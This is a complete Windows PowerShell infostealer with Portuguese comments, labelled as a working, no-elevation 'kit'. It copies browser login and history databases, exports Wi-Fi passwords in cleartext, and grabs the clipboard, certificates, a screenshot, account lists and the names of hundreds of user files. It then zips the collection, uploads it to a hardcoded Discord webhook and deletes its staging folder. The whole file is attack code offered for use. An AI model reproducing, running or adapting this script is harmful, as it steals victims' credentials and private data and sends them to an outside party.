# ----------
# KIT v2 FINAL – 100% funcional, sem elevação, sem áudio
# ----------
$kit = "$env:TEMP\kit"
$hook = "https://discord.com/api/webhooks/1458595316336037923/LcenEw4uom3H_-llTphqVq0Rr2uLqyFwSAk3HJ7E1UCWoCEL-wJ1Qp4HDcHdlSH7vYkV"

New-Item -ItemType Directory -Path $kit -Force | Out-Null

# 1) Sistema & HW
systeminfo | Out-File "$kit\sysinfo.txt" -Encoding UTF8
Get-CimInstance Win32_ComputerSystem | Out-File "$kit\hw.txt" -Encoding UTF8
Get-CimInstance Win32_Processor | Out-File "$kit\cpu.txt" -Encoding UTF8
Get-CimInstance Win32_BIOS | Out-File "$kit\bios.txt" -Encoding UTF8

# 2) Rede & Wi-Fi
Get-NetIPConfiguration | Out-File "$kit\netip.txt" -Encoding UTF8
cmd /c "netsh wlan export profile key=clear folder=$kit"

# 3) Contas & privilégios (sem elevação)
Get-CimInstance Win32_UserAccount | Out-File "$kit\users.txt" -Encoding UTF8
net localgroup administradores | Out-File "$kit\admins.txt" -Encoding UTF8
# Logons via Get-WinEvent (funciona sem admin)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -Max 200 -ErrorAction SilentlyContinue |
    Select TimeCreated,Id,LevelDisplayName,Message |
    Out-File "$kit\logons.txt" -Encoding UTF8

# 4) Navegadores – login & histórico
$browserPaths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
    "$env:APPDATA\Mozilla\Firefox\Profiles\*.default*\logins.json",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
)
$browserPaths | ?{ Test-Path $_ } | %{
    Copy-Item $_ "$kit\$(Split-Path -Leaf $_)-$(Get-Random).db" -ErrorAction SilentlyContinue
}

# 5) Certificados pessoais
Get-ChildItem Cert:\CurrentUser\My |
    Select Subject,Thumbprint,NotAfter |
    Out-File "$kit\mycerts.txt" -Encoding UTF8

# 6) Clipboard atual
Get-Clipboard | Out-File "$kit\clipboard.txt" -Encoding UTF8

# 7) Arquivos recentes
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" |
    Select Name,LastWriteTime |
    Out-File "$kit\recent.txt" -Encoding UTF8

# 8) Lista drives & “top 500” arquivos interessantes
Get-PSDrive -PSProvider FileSystem | Out-File "$kit\drives.txt" -Encoding UTF8
$exts = @("*.pdf","*.doc*","*.xls*","*.txt","*.csv","*.db","*.sqlite","*.pst")
Get-ChildItem C:\ -Include $exts -Recurse -Depth 2 -ErrorAction SilentlyContinue |
    Select FullName,Length,LastWriteTime |
    Sort Length -Descending |
    Select -First 500 |
    Export-Csv "$kit\top_files.csv" -NoTypeInformation

# 9) Screenshot
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
$g = [System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen(0,0,0,0,$bmp.Size)
$pathSS = "$kit\screenshot.jpg"
$bmp.Save($pathSS, [System.Drawing.Imaging.ImageFormat]::Jpeg)
$g.Dispose(); $bmp.Dispose()

# 10) Compacta tudo
$zip = "$env:TEMP\kit_$(Get-Date -Format yyyyMMdd_HHmmss).zip"
Compress-Archive -Path "$kit\*" -Destination $zip -Force

# 11) Envia para o Discord (corpo montado sem aspas quebradas)
$FileBin = [System.IO.File]::ReadAllBytes($zip)
$Enc      = [System.Text.Encoding]::GetEncoding('iso-8859-1')
$fileEnc  = $Enc.GetString($FileBin)
$boundary = [System.Guid]::NewGuid().ToString()
$CRLF     = "`r`n"

$bodyLines = (
    "--$boundary",
    "Content-Disposition: form-data; name=`"content`"",
    "",
    "Kit $env:COMPUTERNAME – $(Get-Date)",
    "--$boundary",
    "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path -Leaf $zip)`"",
    "Content-Type: application/octet-stream",
    "",
    $fileEnc,
    "--$boundary--"
) -join $CRLF

try {
    Invoke-RestMethod -Uri $hook -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
} catch {}


# 12) Limpa só a pasta $kit
Remove-Item $kit -Recurse -Force
